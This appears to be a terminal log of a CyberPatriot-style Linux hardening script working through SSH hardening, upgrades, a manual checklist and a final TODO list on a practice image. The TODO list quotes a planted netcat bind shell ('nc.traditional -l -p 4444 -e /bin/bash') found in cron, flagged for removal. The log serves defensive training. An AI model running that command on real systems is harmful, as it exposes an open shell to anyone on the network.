+  ? Optional: l = lynis in the background, n = nmap localhost scan (purged after), ln = both, Enter = skip: 
+
+  [1;32m[+][0m portandmisc done in 8s. Listener table: /root/cp-state/listeners.tsv
+
+  [1;32m[+][0m Ports done in 8s - 1 new TODO item(s), t lists them. Full output: /root/cp-state/logs/ports.log
+
+[1;36m======== CP19 start.sh ========[0m  2m46s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [1;32m[x][0m Ports                           8s
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (5 open)
+  Enter = 8 Critical services | 1-11 = that step | t = TODO (5) | a = auto on/off | q = quit
+> 
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+
+[1;36m=== Step: Critical services  (services/critical.sh)   log: /root/cp-state/logs/critical.log ===[0m
+
+[1;36m=== Critical services ===[0m
+  Plan: ssh
+
+[1;36m################ ssh ################[0m
+
+[1;36m=== SSH hardening ===[0m
+  [1;32m[+][0m Baseline 'ssh': no open findings
+  [*] Backup: /root/cp-backups/20261111_030335/etc/ssh/sshd_config
+  [*] Backup: /root/cp-backups/20261111_030335/etc/ssh/sshd_config.d
+  [*] Backup: /root/cp-backups/20261111_030335/etc/issue.net
+  README-dependent SSH settings (current values) - Enter keeps all of them:
+      Port 22 | password login allowed | AllowUsers none | DenyUsers none | DenyGroups none | SFTP-only no
+  ? Does the README change any of these (port, key-only login, allowed/denied users or groups, SFTP-only)? [y/N]: n
+  [1;32m[+][0m Perms: sshd_config + drop-ins 600 root, host keys 600/644, ~/.ssh 700 + keys 600 for 7 accounts
+  [*] (auto) Remove /root/.ssh/authorized_keys (1 key(s): eve@kali )? root never needs SSH keys on a CP image (backed up) -> yes
+  [*] Backup: /root/cp-backups/20261111_030335/root/.ssh/authorized_keys
+  [1;32m[+][0m Removed /root/.ssh/authorized_keys
+  [1;32m[+][0m sshd -t: config valid
+  [1;32m[+][0m UFW: allowed application profile 'OpenSSH'
+  [*] (auto) Install fail2ban (bans SSH brute force; installs in the background, needs network)? -> yes
+  [*] fail2ban is installing in the background (log: /root/cp-state/fail2ban-install.log)
+  [1;32m[+][0m SSH restarted and active
+  [1;32m[+][0m Effective sshd settings (sshd -T) match
+  [1;32m[+][0m SSH answers on localhost:22
+  Changed (effective): Banner:none->/etc/issue.net Compression:yes->no MaxAuthTries:6->3 
+      PermitRootLogin:without-password->no ClientAliveCountMax:3->2 X11Forwarding:yes->no 
+      AllowTcpForwarding:yes->no LoginGraceTime:120->30 MaxSessions:10->4 MaxStartups:10:30:100->10:30:60 
+      ClientAliveInterval:0->300 AllowAgentForwarding:yes->no LogLevel:info->verbose DisableForwarding:no->yes
+      (no config file changed - already hardened)
+  [1;32m[+][0m SSH hardening complete (4s)
+
+[1;36m=== Critical services summary (4s) ===[0m
+  ssh        active hardened ok                                       4s
+  Open TODOs (all scripts): 5  ->  cat /root/cp-state/TODO.txt
+
+  [1;32m[+][0m Critical services done in 4s. Full output: /root/cp-state/logs/critical.log
+
+[1;36m======== CP19 start.sh ========[0m  2m55s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [1;32m[x][0m Ports                           8s
+   8 [1;32m[x][0m Critical services               4s
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (5 open)
+  Enter = 9 Upgrades (install downloaded) | 1-11 = that step | t = TODO (5) | a = auto on/off | q = quit
+> 
+
+[1;36m=== Upgrades - install what the background job downloaded ===[0m
+  [*] Repositories apt uses (anything that is not Ubuntu/Mint/Canonical: check /etc/apt/sources.list*):
+      http://archive.ubuntu.com/ubuntu
+      http://security.ubuntu.com/ubuntu
+  [1;32m[+][0m Nothing to upgrade.
+
+[1;36m======== CP19 start.sh ========[0m  2m58s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [1;32m[x][0m Ports                           8s
+   8 [1;32m[x][0m Critical services               4s
+   9 [1;32m[x][0m Upgrades (install downloaded)   0s
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (5 open)
+  Enter = 10 LATE MANUAL list | 1-11 = that step | t = TODO (5) | a = auto on/off | q = quit
+> 
+
+[1;36m=== LATE MANUAL list - from CP Linux Checklist.txt (copy commands from the tracker or below) ===[0m
+[1;36m* Do README user/group modification (usersandsudo.sh, step 4, does most of it - verify)[0m
+   * Add users, create groups, set passwords the README asks for (usersandsudo.sh creates missing README accounts, asks for the README's groups and removes unauthorized users / fixes admin rights - do by hand only what it could not)
+[1;36m* Check the authorized administrator passwords given in the README (step 4 offers ONE new strong password for every README user except you and lists weak README passwords as TODOs - verify)[0m
+   * Read every admin password the README lists
+   * Change any that stand out as insecure: blank, "password"/"123456"-style, same as the username, a plain dictionary word, short (under 12 characters), or the same as another user's
+      * sudo passwd <user>
+      * New password must pass the policy systemconfig.sh sets: 12+ characters with upper, lower, digit and symbol
+   * WRITE DOWN every password you change, including your own account's (sudo needs it)
+[1;36m* Ensure services are legit (fileandpackage.sh asks about unwanted service packages, baseline B5/B6 lists unknown units/listeners)[0m
+   * systemctl list-units --type=service --all
+[1;36m* Disable CUPS - unless the README needs printing (fileandpackage.sh offers to remove it, default keep)[0m
+   * sudo systemctl disable --now cups cups-browsed
+[1;36m* Check cron (systemconfig.sh SYS10 lists cron files no package installed + all user crontabs, deletes obvious reverse shells - verify)[0m
+   * sudo crontab -l
+   * crontab -l
+   * sudo ls /etc/cron.*
+   * cat /etc/crontab
+   * check /etc/init/ and /etc/init.d/
+[1;36m* Verify package integrity[0m
+   * Apt
+      * Check /etc/apt/sources.list (and /etc/apt/sources.list.d/) for suspicious repositories and make sure that is secure
+      * Check apt repository policy
+         * apt-cache policy
+      * Check apt trusted keys
+         * apt-key list
+[1;36m* Secure session timeout - writes /etc/profile.d/timeout.sh (TMOUT=600, readonly TMOUT, export TMOUT) and makes it executable; new login shells pick it up[0m
+printf 'TMOUT=600\nreadonly TMOUT\nexport TMOUT\n' | sudo tee /etc/profile.d/timeout.sh >/dev/null && sudo chmod +x /etc/profile.d/timeout.sh && sudo bash /etc/profile.d/timeout.sh && cat /etc/profile.d/timeout.sh
+[1;36m* Secure grub - GRUB_TIMEOUT_STYLE=hidden and GRUB_TIMEOUT=5 in /etc/default/grub (replaces existing lines), then update-grub applies it[0m
+sudo sed -i -E '/^#?[[:space:]]*GRUB_TIMEOUT(_STYLE)?=/d' /etc/default/grub && printf 'GRUB_TIMEOUT_STYLE=hidden\nGRUB_TIMEOUT=5\n' | sudo tee -a /etc/default/grub >/dev/null && sudo update-grub
+[1;36m* Change account expiry defaults - EXPIRE=30 and INACTIVE=30 in /etc/default/useradd - do it AFTER every README user has been added[0m
+   * Careful: EXPIRE is a date - a plain number means days since 1970, so accounts created AFTER this are already expired (users that exist are not affected)
+sudo sed -i -E '/^#?[[:space:]]*(EXPIRE|INACTIVE)=/d' /etc/default/useradd && printf 'EXPIRE=30\nINACTIVE=30\n' | sudo tee -a /etc/default/useradd >/dev/null && grep -E '^(EXPIRE|INACTIVE)=' /etc/default/useradd
+[1;36m* Monitor processes (top)[0m
+[1;36m* Install updates for bash, kernel, LibreOffice, and service specified in the readme (start.sh step 9 does this - verify, or by hand:)[0m
+   * Upgrades
+      * sudo apt update
+      * sudo apt full-upgrade -y (enable automatic updates first in gui for mint)
+      * sudo apt upgrade $service
+      * sudo apt dist-upgrade -y
+[1;36m* Enable automatic updates (systemconfig.sh now does Mint's Automation tab too - just verify here)[0m
+   * Mint - Update Manager -> Edit -> Preferences ->
+      * Automation -> Select All
+      * Options -> Refresh the list of updates automatically
+      * Fix mirror -> restore default settings -> refresh (also the fix when apt-get update fails)
+[1;36m* Disable root login (systemconfig.sh asks; verify: sudo grep '^root:!' /etc/shadow)[0m
+   * sudo passwd -l root
+[1;36m* Enforce permissions (automated in systemconfig.sh SYS9 - verify)[0m
+   * chmod 640 /etc/shadow
+   * chown root:shadow /etc/shadow
+   * chmod 644 /etc/passwd
+   * chmod 644 /etc/group
+if you still have sudo:
+[1;36m* Actually look through service config, try visiting, ensure is ssl if available, ls -la to check perms, try to think like an attacker[0m
+
+
+  ? LATE MANUAL items done? [Y/n]: 
+  [1;32m[+][0m Ticked.
+
+[1;36m======== CP19 start.sh ========[0m  3m03s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [1;32m[x][0m Ports                           8s
+   8 [1;32m[x][0m Critical services               4s
+   9 [1;32m[x][0m Upgrades (install downloaded)   0s
+  10 [1;32m[x][0m LATE MANUAL list                2s
+  11 [ ] Final TODO list                 (5 open)
+  Enter = 11 Final TODO list | 1-11 = that step | t = TODO (5) | a = auto on/off | q = quit
+> 
+
+[1;36m=== TODO - things only you can finish (/root/cp-state/TODO.txt) ===[0m
+   1. [usersandsudo.sh] WRITE DOWN the new password you set for: alice bob carol dave frank
+   2. [systemconfig.sh] Review /etc/hosts entries (hijack?): 172.17.0.2 mint-cptest;
+   3. [fileandpackage.sh] Plaintext password file? /home/bob/passwords.txt - delete it if the README doesn't need it
+   4. [fileandpackage.sh] Glance over 5 other files in user folders: /root/cp-state/files-other.txt (archives, scripts, documents)
+   5. [portandmisc.sh] Find what started '/bin/nc.traditional -l -p 4444 -e /bin/bash ' (tcp/4444, was in cron.service) - cron job, rc.local, user crontab, profile? - and remove it
+  ? All TODO items handled? [Y/n]: 
+
+[1;36m======== CP19 start.sh ========[0m  3m09s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [1;32m[x][0m Ports                           8s
+   8 [1;32m[x][0m Critical services               4s
+   9 [1;32m[x][0m Upgrades (install downloaded)   0s
+  10 [1;32m[x][0m LATE MANUAL list                2s
+  11 [1;32m[x][0m Final TODO list                 3s
+  All steps done | 1-11 = that step | t = TODO (5) | a = auto on/off | q = quit
+> q
+
+  [*] Quit. Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+  [*] Background jobs keep running. Run 'sudo bash start.sh' again to continue where you left off.
+
+[drive2] EXIT 0
